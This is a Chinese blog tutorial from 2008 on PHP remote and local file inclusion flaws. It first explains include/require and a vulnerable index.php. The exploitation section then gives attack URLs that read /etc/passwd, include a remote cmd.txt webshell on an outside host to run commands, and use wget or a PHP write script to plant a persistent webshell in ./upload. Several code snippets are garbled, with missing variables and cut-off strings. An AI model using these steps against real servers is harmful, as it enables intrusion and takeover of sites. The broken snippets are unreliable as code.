---
title: 远程包含和本地包含漏洞的原理
description: 首先，我们来讨论包含文件漏洞,首先要问的是,什么才是"远程文件包含漏洞"？回答是：服务器通过php的特性（函数）去包含任意文件时，由于要包含的这个文件来源过滤不严，从而可去包含一个恶意文件，而我们可以构造这个恶意文件来达到邪恶的目的。几乎所有的cgi程序都有这样的bug，只是具体的表现方式不一样罢了。
date: 2008-05-15 09:41:12
category: 技术文章
tags: ['远程文件包含RFI', '原理']
post_id: 482
alias: RFI-yuancheng-wenjian-baohan-loudong-yuanli
ViewNums: 4662
---

首先，我们来讨论包含文件[漏洞](/tags/%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF),首先要问的是,什么才是"远程文件包含漏洞"？回答是：服务器通过[php](/tags/PHP)的特性（函数）去包含任意文件时，由于要包含的这个文件来源过滤不严，从而可去包含一个恶意文件，而我们可以构造这个恶意文件来达到邪恶的目的。几乎所有的 cgi程序都有这样的 bug，只是具体的表现方式不一样罢了。

一、涉及到的危险函数〔include(),require()和include_once(),require_once()〕
```php
include() && require()语句:包括并运行指定文件。
```
这两种结构除了在如何处理失败之外完全一样。include() 产生一个警告而 require() 则导致一个致命错误。换句话说，如果你想在遇到丢失文件时停止处理页面就用 require()。include() 就不是这样，脚本会继续运行。
如果"allow_url_fopen"在 PHP 中被激活（默认配置），也可以用 URL（通过 HTTP 或者其它支持的封装协议）而不是本地文件来指定要被包括的文件。如果目标服务器将目标文件作为 PHP 代码解释，则可以用适用于HTTP GET 的 URL 请求字符串来向被包括的文件传递变量。
```php
require_once()　＆＆　include_once()
```
require_once ()和include_once() 语句在脚本执行期间包括并运行指定文件。此行为和 require() 语句类似，唯一区别是如果该文件中的代码已经被包括了，则不会再次包括。适用于在[脚本](/tags/%E8%84%9A%E6%9C%ACScript)执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。

二、为什么要包含文件

程序员写程序的时候，不喜欢干同样的事情，也不喜欢把同样的代码（比如一些公用的函数）写几次，于是就把需要公用的代码写在一个单独的文件里面，比如 share.php，而后在其它文件进行包含调用。在[php](/tags/PHP)里，我们就是使用上面列举的那几个函数来达到这个目的的，它的工作流程：如果你想在 main.php里包含share.php,我将这样写include("share.php")就达到目的，然后就可以使用share.php中的函数了，像这个写死需要包含的文件名称的自然没有什么问题，也不会出现漏洞，那么问题到底是出在哪里呢？
有的时候可能不能确定需要包含哪个文件，比如先来看下面这个文件index.php的代码：

CODE:
--------------------------------------------------------------------------------
```php
if ([page]) {
include GET[page];
} else {
include "home.
}
```
很正常的一段PHP代码，它是怎么运作的呢？这里面涉及到GET的意义，我就不打算讲了（要不又能写篇HTTP的文章了），如果你还不了解GET，POST,等，那么你需要再Google一些相关的资料好好补一补了。
上面这段代码的使用格式可能是这样的：http://www.1steam.cn/php/index.php?page=main.php或者http: //www.1steam.cn/php/index.php?page=downloads.php ,结合上面代码，简单说下怎么运作的：

1.提交上面这个URL，在index.php中就取得这个page的值（_GET[page]）。
2.判断GET[page]是不是空，若不空（这里是main.php）就用include来包含这个文件。
3.若_GET[page]空的话就执行else，来include　home.php　这个文件。

三、为什么会产生漏洞

你也许要说，这样很好呀，可以按照URL来动态包含文件，多么方便呀，怎么产生漏洞的呢？问题的答案是：我们不乖巧，我们总喜欢和别人不一样，我们不会按照他的链接来操作，我们可能想自己写想包含（调用）的文件，比如我们会随便的打入下面这个URL：http: //www.1steam.cn/php/index.php?page=hello.php。然后我们的index.php程序就傻傻按照上面我们说得步骤去执行：取page为hello.php，然后去include(hello.php)，这时问题出现了，因为我们并没有hello.php这个文件，所以它 include的时候就会报警告，类似下列信息：
```shell
Quote:
Warning: include(hello.php) [function.include]: failed to open stream: No such file or directory in /vhost/wwwroot/php/index.php on line 3
Warning: include() [function.include]: Failed opening 'hello.php' for inclusion (include_path='.:') in /vhost/wwwroot/php/index.php on line 3
```
注意上面的那个Warning就是找不到我们指定的hello.php文件，也就是包含不到我们指定路径的文件；而后面的警告是因为前面没有找到指定文件，所以包含的时候就出警告了。

四、怎么利用

上面可以看到，问题出现了，那么我们怎么利用这样的漏洞呢，利用方法其实很多，但是实质上都是差不多的，我这里说三个比较常见的利用方法：

1.包含读出目标机上其它文件

由前面我们可以看到，由于对取得的参数page没有过滤，于是我们可以任意指定目标主机上的其它敏感文件，例如在前面的警告中，我们可以看到暴露的绝对路径(vhost/wwwroot/php/)，那么我们就可以多次探测来包含其它文件，比如指定URL为：http: //www.1steam.cn/php/index.php?page=./txt.txt 可以读出当前路径下的txt.txt文件，也可以使用.. /../进行目录跳转（在没过滤../的情况下）；也可以直接指定绝对路径，读取敏感的系统文件，比如这个URL：http: //www.1steam.cn/php/index.php?page=/etc/passwd ，如果目标主机没有对权限限制的很严格，或者启动 Apache的权限比较高，是可以读出这个文件内容的。否则就会得到一个类似于：open_basedir restriction in effect.的Warning。

2.包含可运行的PHP木马

如果目标主机的"allow_url_fopen"是激活的（默认是激活的，没几个人会修改），我们就可以有更大的利用空间，我们可以指定其它URL上的一个包含PHP代码的webshell来直接运行，比如，我先写一段运行命令的PHP代码（加了注释，应该看得懂），如下保存为cmd.txt（后缀不重要，只要内容为PHP格式就可以了）。

以上这个文件的作用就是接受cmd指定的命令，并调用passthru函数执行，把内容返回在1.S.T之间。把这个文件保存到我们主机的服务器上（可以是不支持PHP的主机），只要能通过HTTP访问到就可以了，例如地址如下：http: //www.1ster.cn/cmd.txt ,然后我们就可以在那个漏洞主机上构造如下URL来利用了：http: //www.1steam.cn/php/index.php?page=http://www.1ster.cn/cmd.txt?cmd=ls ,其中 cmd后面的就是你需要执行的命令，其它常用的命令（以*UNIX为例）如下：

Quote:
ll 列目录、文件（相当于Windows下dir)
pwd 查看当前绝对路径
id whoami 查看当前用户
wget　下载指定URL的文件

等等其它的，你主机去BAIDU找吧，就不列举了。

上面的方法就是得到一个Webshell了（虽然这个PHP文件不在目标机上，但是它确实是个Webshell，不是么？呵呵）

3.包含一个创建文件的PHP文件

也许有的人认为还是得到目标机上的一个真实的Webshell比较放心，万一哪天人家发现这儿个包含漏洞修补了，我们就不能再远程包含得到上面的那个"伪 "Webshell了，不是么？可以理解这个心态，我们继续。得到一个真实的Webshell，我们也说两种常见的方法：

1)使用wget之类的命令来下载一个Webshell

这个比较简单，也很常用，在上面我们得到的那个伪webshell中，我们可以执行命令，那么我们也可以调用系统中的一个很厉害的角色， wget，这个命令的强大你可以google下，参数一大堆，绝对搞晕你，呵呵，我们不需要那么复杂，我们就使用一个-O（--output- document=FILE，把文档写到FILE文件中） 就可以了，呵呵。

前提是你在按照前面的步骤放一个包含PHP代码的Webshell在一个可以通过HTTP或者FTP等可以访问的地方，比如：http: //www.1ster.cn/1stphp.txt ,这个文件里写的就是Webshell的内容。然后我们在前面得到的伪Webshell中执行如下的 URL：http://www.1steam.cn/php/index.p ... w.1ster.cn/cmd.txt? cmd=wget http://www.1ster.cn/1stphp.txt -O 1stphp.php ，如果当前目录可写，就能得到一个叫做1stphp.php的Webshell了；如果当前目录不可写，还需要想其它的办法。

2）使用文件来创建

前面的wget可能会遇到当前目录不能写的情况；或者目标主机禁用了（或者没装）这个命令，我们又需要变通一下了，我们可以结合前面的包含文件漏洞来包含一个创建文件（写文件）的PHP脚本，内容如下：

CODE:
--------------------------------------------------------------------------------
```php
$f=file_get_contents("www.1ster.cn/1stphp.打开指定路径的文件流
$=fopen("./upload/1st.php","a"); 　　　　//寻找一个可以的目录，创建一个文件
fwrite (,$f); 　//把前面打开的文件流写到创建的文件里
fclose(); 　　　//关闭保存文件
?>
```
还是写入我们上面用wget下载的那个php文件，但是我们改进了方法，用PHP脚本来实现，可以使用上面的cmd.php?cmd=ll查找可以写的目录，比如这里的upload，然后把文件创建在这个目录下：./upload/1st.php。然后就得到我们的Webshell了。

